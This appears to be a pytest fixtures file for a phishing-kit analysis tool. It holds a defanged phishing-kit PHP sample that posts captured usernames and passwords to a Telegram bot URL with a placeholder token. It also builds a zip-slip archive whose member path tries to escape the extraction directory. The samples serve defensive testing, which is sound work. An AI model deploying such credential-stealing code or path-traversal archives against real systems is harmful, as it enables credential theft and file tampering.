"""Shared pytest fixtures.

The unit suite runs WITHOUT a database or network. Integration tests that need a
live Postgres are marked ``@pytest.mark.integration`` and are skipped unless
``PKINTEL_DB_URL`` points at a reachable database.
"""

from __future__ import annotations

import io
import os
import zipfile
from pathlib import Path

import pytest


@pytest.fixture
def sample_php_login() -> str:
    """A tiny, defanged phishing-kit-style PHP file (no real credentials)."""
    return (
        "<?php\n"
        "// coded by TestActor\n"
        "$bot = '1234567890:AAF-ExampleTokenExampleTokenExampleTok';\n"
        "$chat_id = '999888777';\n"
        "$to = 'attacker.dropbox@example.com';\n"
        "if (isset($_POST['pass'])) {\n"
        "    $msg = $_POST['user'] . ':' . $_POST['pass'];\n"
        "    file_get_contents('https://api.telegram.org/bot'.$bot.'/sendMessage?chat_id='.$chat_id.'&text='.$msg);\n"
        "}\n"
    )


@pytest.fixture
def make_zip(tmp_path: Path):
    """Factory: build a .zip from a {arcname: bytes|str} mapping in tmp_path."""

    def _make(name: str, members: dict[str, bytes | str]) -> Path:
        dest = tmp_path / name
        with zipfile.ZipFile(dest, "w") as zf:
            for arc, data in members.items():
                if isinstance(data, str):
                    data = data.encode()
                zf.writestr(arc, data)
        return dest

    return _make


@pytest.fixture
def zip_slip_bytes() -> bytes:
    """A malicious zip whose member tries to escape the extraction dir."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../../evil.php", b"<?php // should never be written here")
        zf.writestr("ok.php", b"<?php echo 1;")
    return buf.getvalue()


def _db_available() -> bool:
    return bool(os.environ.get("PKINTEL_DB_URL"))


requires_db = pytest.mark.skipif(
    not _db_available(), reason="integration test: set PKINTEL_DB_URL to a live Postgres"
)
